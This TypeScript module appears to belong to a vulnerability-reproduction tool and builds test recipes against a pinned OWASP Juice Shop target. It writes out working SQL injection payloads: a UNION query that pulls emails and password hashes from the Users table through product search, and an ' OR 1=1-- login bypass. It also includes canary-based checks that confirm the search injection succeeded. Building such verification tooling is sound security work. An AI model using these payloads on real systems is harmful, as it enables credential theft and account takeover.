import type {
  GetRecipesForTargetFn,
  ReproductionProbeResult,
  ReproductionRecipe,
  ReproductionRequest,
} from "@/lib/reproduction/types";

/**
 * Reproduction scenarios from docs/decisions.md Q18, against the one pinned Juice Shop target.
 * Recipes are code because `oracleCheck` cannot live in a jsonb column (see the type doc in
 * lib/reproduction/types.ts). Only the target-specific values -- base URL, search path, canary
 * registration path -- come from the bound TargetProfile's `config`; the frozen scenario inputs
 * (exploit payloads, fixture password, expected status codes) are constants in this module,
 * matching the spec Q18 froze rather than anything a report or agent could supply.
 */

/** Substituted by the orchestrator with a fresh, unpredictable value before the request is
 * sent. Every request in a recipe run shares the one canary. */
const CANARY_PLACEHOLDER = "{{canary}}";

/**
 * Juice Shop enforces no password strength rule at all (models/user.ts has no length or
 * complexity validator, only a hash-on-write setter), so any non-empty string registers
 * cleanly. Fixed rather than random purely for readable fixture logs.
 */
const FIXTURE_PASSWORD = "bd-fixture-Only1!";

type JuiceShopConfig = {
  baseUrl: string;
  searchPath: string;
  canaryRegistrationPath: string;
};

/**
 * `target.config` is `unknown` at the type level (a jsonb column in practice), so narrow it
 * before reading anything out of it rather than casting. `baseUrl` is validated for
 * completeness even though it plays no part in the paths below -- the orchestrator resolves
 * these relative paths against the target's own base URL, not the recipe.
 */
function isJuiceShopConfig(config: unknown): config is JuiceShopConfig {
  if (typeof config !== "object" || config === null) return false;
  const c = config as Record<string, unknown>;
  return (
    typeof c.baseUrl === "string" &&
    typeof c.searchPath === "string" &&
    typeof c.canaryRegistrationPath === "string"
  );
}

/**
 * Registers a fresh user through Juice Shop's public registration endpoint. This is the
 * trusted fixture: the canary email lands in the Users table the UNION payload reads from, with
 * no direct database access and no image modification -- see decisions.md Q18, "How the canary
 * gets seeded."
 *
 * Body shape verified against the pinned v17.3.0 source, not guessed: models/user.ts declares
 * only `email` and `password` (no `passwordRepeat`, `securityQuestion` or `securityAnswer`
 * field on the User model), and server.ts's pre-finale handler for `POST /api/Users` only acts
 * on `passwordRepeat` when it is present -- omitting it, or including it, both register
 * successfully. `passwordRepeat` is included anyway because it is what the real registration
 * form sends and costs nothing to match.
 */
function registrationFixture(config: JuiceShopConfig): { request: ReproductionRequest } {
  return {
    request: {
      method: "POST",
      path: config.canaryRegistrationPath,
      body: {
        email: CANARY_PLACEHOLDER,
        password: FIXTURE_PASSWORD,
        passwordRepeat: FIXTURE_PASSWORD,
      },
    },
  };
}

/** Frozen in decisions.md Q18: 9 columns, email in position 2, password in position 3. */
const SQLI_SEARCH_PAYLOAD =
  "qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--";

/**
 * The search route runs `SELECT * FROM Products WHERE ...` (routes/search.ts), so a compound
 * UNION result takes its column names from Products, not from Users: id, name, description,
 * price, deluxePrice, image, createdAt, updatedAt, deletedAt (models/product.ts, plus
 * Sequelize's default timestamps and the paranoid `deletedAt`). Position 2 of the UNION is
 * therefore returned to the client under the key "name", holding the injected email -- never a
 * field literally called "email". Checking "name" specifically (rather than a raw substring
 * search over the whole body, which is what Juice Shop's own internal challenge tracker does)
 * is what keeps a canary that coincidentally appears elsewhere in the payload from counting.
 */
function canaryInSearchResponse(body: string, canary: string): boolean {
  let parsed: unknown;
  try {
    parsed = JSON.parse(body);
  } catch {
    return false;
  }
  if (typeof parsed !== "object" || parsed === null) return false;
  const rows = (parsed as { data?: unknown }).data;
  if (!Array.isArray(rows)) return false;
  return rows.some((row) => {
    if (typeof row !== "object" || row === null) return false;
    const name = (row as Record<string, unknown>).name;
    return typeof name === "string" && name.includes(canary);
  });
}

function sqliSearchRecipe(config: JuiceShopConfig): ReproductionRecipe {
  return {
    id: "juice-shop-sqli-search",
    title: "Reflected UNION SQL injection in product search",
    fixture: registrationFixture(config),
    negativeControl: {
      method: "GET",
      path: `${config.searchPath}?q=apple`,
    },
    exploit: {
      method: "GET",
      path: `${config.searchPath}?q=${encodeURIComponent(SQLI_SEARCH_PAYLOAD)}`,
    },
    oracleCheck: (response, canary) => canaryInSearchResponse(response.body, canary),
  };
}

const LOGIN_PATH = "/rest/user/login";

/**
 * Necessary but not sufficient for the auth-bypass claim: decisions.md Q18's frozen oracle for
 * this scenario is that this response's token, used against `GET /api/Users`, returns a dump
 * containing the run's canary email. The login query always matches the first row in the Users
 * table (the seeded admin, id 1) ahead of the canary user, so the login response itself never
 * carries the canary -- only a second, token-authenticated request can show it. `oracleCheck`'s
 * (response, canary) -> boolean shape has no way to make that second call, so this only proves a
 * token was minted. Known limitation, flagged in the PR: the orchestrator needs to issue that
 * follow-up `GET /api/Users` call and check its body for the canary before this scenario can
 * produce a REPRODUCED verdict per spec.
 */
function hasAuthToken(response: ReproductionProbeResult): boolean {
  if (response.status !== 200) return false;
  let parsed: unknown;
  try {
    parsed = JSON.parse(response.body);
  } catch {
    return false;
  }
  if (typeof parsed !== "object" || parsed === null) return false;
  const auth = (parsed as { authentication?: unknown }).authentication;
  if (typeof auth !== "object" || auth === null) return false;
  const token = (auth as Record<string, unknown>).token;
  return typeof token === "string" && token.length > 0;
}

// Kept as a record of the intended scenario; not called from getRecipesForTarget (see the
// comment there) until the oracle-check contract can express the required follow-up
// authenticated request.
// eslint-disable-next-line @typescript-eslint/no-unused-vars
function loginBypassRecipe(config: JuiceShopConfig): ReproductionRecipe {
  return {
    id: "juice-shop-login-bypass",
    title: "Auth-bypass SQL injection in login",
    fixture: registrationFixture(config),
    negativeControl: {
      method: "POST",
      path: LOGIN_PATH,
      body: { email: CANARY_PLACEHOLDER, password: "definitely-the-wrong-password" },
    },
    exploit: {
      method: "POST",
      path: LOGIN_PATH,
      body: { email: "' OR 1=1--", password: "x" },
    },
    oracleCheck: (response) => hasAuthToken(response),
  };
}

export const getRecipesForTarget: GetRecipesForTargetFn = (target) => {
  if (target.name !== "juice-shop-v17.3.0") return [];
  if (!isJuiceShopConfig(target.config)) return [];
  // loginBypassRecipe is defined above but withheld here: its oracleCheck signature is
  // (response, canary) -> boolean, which can only inspect the login response itself. The frozen
  // spec's actual oracle for this scenario needs a second, token-authenticated GET /api/Users
  // call to check for the canary -- without it, hasAuthToken returns true for any successfully
  // minted token, including an unrelated login that never touched the injection at all. That
  // would let this scenario report REPRODUCED without ever proving the exploit. Return this
  // recipe once the oracle-check contract can express a follow-up authenticated request.
  return [sqliSearchRecipe(target.config)];
};
